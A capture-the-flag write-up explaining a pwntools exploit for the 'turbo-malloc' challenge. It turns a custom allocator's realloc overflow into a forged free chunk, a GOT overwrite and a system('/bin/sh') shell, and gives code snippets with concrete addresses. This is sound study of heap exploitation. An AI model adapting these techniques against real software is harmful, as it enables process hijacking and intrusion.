<div align="center">

# turbo-malloc — Ghost Chunks & GOT Hijack

</div>

> One custom allocator, one `realloc` bug, one shell — start to finish, in a ~70-line pwntools exploit.

![Category](https://img.shields.io/badge/category-pwn-red)
![Solved](https://img.shields.io/badge/status-solved_(remote)-success)
![Exploit](https://img.shields.io/badge/exploit-pwntools-blue)
![Target](https://img.shields.io/badge/binary-no_ASLR,_writable_GOT-orange)

This README explains [exploit.py](exploit.py), my solution to the **turbo-malloc** pwn
challenge. The target replaces libc's heap with a custom allocator over a **1 MB static
buffer**, and I turn a single `realloc` overflow into a forged free chunk, an allocation that
overlaps the global note-pointer table and the **GOT**, a libc leak, and
`memcpy` → `system("/bin/sh")`.

```
  stage                primitive                              what it buys
  ──────────────────────────────────────────────────────────────────────────────
  1  forge       realloc copies OLD size into NEW chunk   -> heap overflow
                 (fake {next,size} header planted as note data)
  2  ghost       create(2, 4211168) walks the free list   -> allocation overlapping
                 into my forged header ("ghost chunk")       notes[] + GOT
  3  leak        rewrite notes[] pointers via note 2      -> puts@GOT read
                                                              = libc base
  4  hijack      overwrite memcpy@GOT with system         -> realloc triggers
                 + "/bin/sh" note                             system("/bin/sh")
  ──────────────────────────────────────────────────────────────────────────────
  4 menu actions of setup, then 4 to own the process. No brute force, no leaks wasted.
```

## The short version

1. The heap is a `static char memory[1MB]` — **no ASLR, fixed addresses**, and in-use chunks
   are marked by a header `{next = MAGIC, size}` while free chunks form a singly-linked list
   whose headers are **just data I can write**.
2. `turbo_realloc(ptr, smaller)` copies `chunk->size` — the **old** size — into the smaller
   new allocation. That linear overflow drags a fake chunk header into place.
3. When that region frees, the allocator trusts my forged header. One giant `malloc`
   (4,211,168 bytes) walks the list onto it, and note 2's memory lands **on top of the
   `notes[]` pointer table and the GOT**.
4. Rewriting `notes[]` gives arbitrary read/write: leak `puts@GOT` for libc, store
   `"/bin/sh"`, swap `memcpy@GOT` for `system`, and let `realloc`'s own `memcpy` call pull
   the trigger.

> **Why no ASLR dance?** The arena, the pointer table and the GOT are all static globals at
> fixed addresses. One leak (libc via `puts@GOT`) is the only address math the exploit needs.

## Contents

- [The bug](#the-bug)
- [The exploit, stage by stage](#the-exploit-stage-by-stage)
  - [1. Planting the ghost chunk](#1-planting-the-ghost-chunk)
  - [2. Allocating the ghost](#2-allocating-the-ghost)
  - [3. Leaking libc through note pointers](#3-leaking-libc-through-note-pointers)
  - [4. `memcpy` becomes `system`](#4-memcpy-becomes-system)
- [Running it](#running-it)
- [Jargon, briefly](#jargon-briefly)
- [Thanks](#thanks)

---

## The bug

```c
void *turbo_realloc(void *ptr, size_t size) {
    void *new_memory = turbo_malloc(size);        // may be SMALLER than the old chunk
    ...
    memcpy(new_memory, chunk->memory, chunk->size);  // copies OLD size bytes
    turbo_free(ptr);
    return new_memory;
}
```

`realloc` down must copy `min(old, new)` bytes. Copying `old` overflows the new allocation
into whatever follows it. Combined with an explicit free list whose node headers live inside
user-writable note data, that overflow becomes **free-list forgery** — the grandparent of
tcache poisoning, minus libc's hardening.

The allocator also **never consolidates** free chunks ("turbo-heap must be blazingly fast"),
which keeps my forged node alive on the list instead of merging it away.

## The exploit, stage by stage

### 1. Planting the ghost chunk

```python
create(0, 256); create(1, 32)
write_note(0, b'A'*0x20 + p64(0x5040d8) + p64(0x20) + b'B'*(0x100-0x30))  # fake header
delete(1)              # real 32-byte chunk freed
realloc_note(0, 32)    # 32-byte alloc lands on chunk 1's slot; memcpy drags the
                       # 256 forged bytes along, planting the header inside live data
```

The `next` value (`0x5040d8`) points the ghost at the region in front of the `notes[]`
table; the `size` I control decides how big the ghost allocation will be.

### 2. Allocating the ghost

```python
create(2, 4211168)     # one-shot size tuned so the allocator walks the free
                       # list onto the ghost chunk ("malloc fantasma")
```

Note 2's memory now overlaps `notes[]` (`0x5040e0`) and reaches up to the GOT.

### 3. Leaking libc through note pointers

```python
write_note(2, p64(0x404010) + p64(0x5040e8) + p64(0x404048) + ...)  # notes[1] -> puts@GOT
read_note(1)           # leak; system = leak - 0x87be0 + 0x58750
```

### 4. `memcpy` becomes `system`

```python
create(4, 32); write_note(4, b"/bin/sh\x00")   # the argument
write_note(3, p64(system))                     # notes[3] -> memcpy@GOT
realloc_note(1, 32)                            # realloc's own memcpy(...) -> system("/bin/sh")
p.interactive()
```

## Running it

The exploit is calibrated for the provided challenge environment (binary, libc and loader in
[`challenge/`](challenge), along with the original source `turbo-malloc.c` and Docker setup):

```bash
# remote (as solved):
python3 exploit.py
# locally: swap the remote() line for process('./challenge/turbo-malloc')
```

> [!WARNING]
> Point it only at the challenge infrastructure you're authorized to test.

## Jargon, briefly

| Term | Meaning |
| --- | --- |
| **Ghost chunk** | A free-list node forged from note data; the allocator later hands out memory for it. |
| **GOT** | Global Offset Table — writable here, so overwriting an entry redirects a libc call. |
| **MAGIC** (`0xf45735`) | The marker that distinguishes in-use chunks from free ones. |
| **Overlapping chunks** | Two live allocations covering the same memory — the core primitive. |

## Thanks

- The challenge authors for a clean "reinvent malloc, inherit its bugs" exercise.

*Exploit: [exploit.py](exploit.py) · Challenge: [challenge/](challenge)*
